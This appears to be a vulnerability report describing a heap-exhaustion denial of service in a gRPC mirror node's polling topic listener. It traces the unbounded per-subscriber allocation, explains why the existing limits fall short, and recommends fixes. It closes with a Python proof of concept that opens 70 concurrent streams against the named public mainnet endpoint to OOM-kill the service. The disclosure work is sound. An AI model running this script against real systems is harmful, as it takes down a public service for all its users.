### Title
Unbounded Concurrent Heap Allocation via Per-Subscriber Full-Page Materialization in `PollingTopicListener.poll()`

### Summary
When the gRPC listener is configured in `POLL` mode, each subscriber receives an independent polling loop that calls `TopicMessageRepositoryCustomImpl.findByFilter()`, which unconditionally materializes up to `maxPageSize` (default 5000) `TopicMessage` objects into a `java.util.List` on the JVM heap via `getResultList()`. Because there is no global cap on concurrent subscribers and `maxConcurrentCallsPerConnection=5` is a per-connection-only limit, an unprivileged attacker opening many connections to a high-throughput topic can drive concurrent heap allocations that exhaust the JVM heap and crash the service.

### Finding Description

**Code path:**

`PollingTopicListener.poll()` (lines 51–62) computes `pageSize = Math.min(limit, listenerProperties.getMaxPageSize())` — capped at 5000 — and builds a new filter with that limit:

```java
// PollingTopicListener.java:57-61
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
...
var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

`TopicMessageRepositoryCustomImpl.findByFilter()` (line 60) then calls:

```java
return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
```

`getResultList()` is a JPA bulk-fetch: it executes the SQL query and loads **all matching rows** (up to `setMaxResults(5000)`) into a single `ArrayList<TopicMessage>` in heap memory before returning. The `Stream` wrapper is a view over that already-materialized list — no lazy/cursor-based streaming occurs.

**Root cause and failed assumption:**

The design assumes that `Flux.fromStream(...)` provides lazy, backpressure-aware streaming. It does not: the `Stream` is backed by a fully-materialized `List`, so the entire page is allocated at the moment `poll()` is called, regardless of downstream consumption rate.

In `POLL` mode (`listenerProperties.type = POLL`), each subscriber gets its own `PollingContext` and independent `Flux.defer(() -> poll(context)).repeatWhen(...)` loop. There is **no sharing** between subscribers (unlike `SHARED_POLL`). Every subscriber independently calls `findByFilter()` every 500ms.

**No global subscriber limit exists.** The only throttle is `maxConcurrentCallsPerConnection = 5` (per-connection), configured in `NettyProperties` and applied in `GrpcConfiguration`:

```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

This is a per-TCP-connection limit. An attacker can open arbitrarily many connections.

**Exploit flow:**

1. Attacker identifies or creates a topic with high message throughput (thousands of messages/second — any public HCS topic qualifies on mainnet).
2. Attacker opens `C` gRPC connections, each with 5 concurrent `subscribeTopic` calls (the per-connection maximum), for `N = 5C` total concurrent subscribers.
3. Each subscriber's `poll()` fires every 500ms, calling `getResultList()` which allocates a `List<TopicMessage>` of up to 5000 entries.
4. Each `TopicMessage` carries a `message` field up to 6KiB (per the HCS proto spec). Worst-case per-poll allocation: `5000 × 6KB ≈ 30MB`.
5. With `N = 70` concurrent subscribers (14 connections × 5): `70 × 30MB = 2.1GB` of concurrent heap pressure — exceeding the Kubernetes memory limit of `2048Mi` defined in `charts/hedera-mirror-grpc/values.yaml`.
6. JVM throws `OutOfMemoryError`; the gRPC service crashes or becomes unresponsive.

**Why existing checks are insufficient:**

- `maxConcurrentCallsPerConnection = 5`: per-connection only; attacker opens many connections.
- `maxPageSize = 5000` with `@Min(32)`: caps page size but does not limit concurrent subscribers or total heap usage.
- `listenerProperties.getInterval() = 500ms`: polling interval; does not reduce per-poll allocation size.
- No authentication on `subscribeTopic`: any external client can subscribe.
- No global subscriber count limit or per-IP connection limit in the codebase.

### Impact Explanation
A successful attack crashes or OOM-kills the gRPC mirror node service, denying all HCS topic subscription functionality to all legitimate users. Recovery requires pod restart. The attack is repeatable immediately after restart. Given that the gRPC API is the primary interface for HCS message streaming and is publicly exposed, this constitutes a high-severity non-network DoS against a critical infrastructure component.

### Likelihood Explanation
The attack requires only: (a) the operator has configured `listener.type=POLL` (a documented, supported option, used when Redis is unavailable), and (b) a topic with sufficient message volume exists (trivially satisfied on mainnet). No credentials, no special knowledge, and no prior access are required. The attacker needs only a gRPC client library and the ability to open multiple TCP connections — standard tooling. The attack is fully repeatable.

### Recommendation

1. **Replace `getResultList()` with true cursor-based streaming.** The comment at line 60 acknowledges `getResultStream()` was rejected due to reactive stream incompatibility. Use a `ScrollableResults`/Hibernate `StatelessSession` with a JDBC `ResultSet` fetch size, or use Spring Data's `@QueryHints` with `HINT_FETCH_SIZE` to stream rows lazily rather than materializing the full page.

2. **Enforce a global concurrent subscriber limit.** Add an atomic counter (similar to `subscriberCount` in `TopicMessageServiceImpl`) that rejects new subscriptions above a configurable threshold.

3. **Add per-IP or per-connection subscription rate limiting** at the gRPC interceptor layer.

4. **Reduce `maxPageSize` default** or add a hard upper bound (`@Max`) in `ListenerProperties` to limit worst-case per-poll allocation.

### Proof of Concept

```python
# Requires: grpcio, grpcio-tools, hedera proto stubs
import grpc, threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto.timestamp_pb2 import Timestamp
from proto.basic_types_pb2 import TopicID

MIRROR_NODE = "mainnet-public.mirrornode.hedera.com:443"
# High-throughput topic (e.g., a known active HCS topic on mainnet)
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 96986

def subscribe():
    channel = grpc.secure_channel(MIRROR_NODE, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TopicID(shardNum=TOPIC_SHARD, realmNum=TOPIC_REALM, topicNum=TOPIC_NUM),
        consensusStartTime=Timestamp(seconds=0, nanos=0),
        limit=0  # unlimited
    )
    for _ in stub.subscribeTopic(req):
        pass  # consume to keep stream alive

# Open many connections, each with up to 5 concurrent streams
threads = []
for _ in range(70):  # 14 connections * 5 streams each
    t = threading.Thread(target=subscribe, daemon=True)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
# Expected result: mirror node gRPC pod OOMKilled within seconds
```
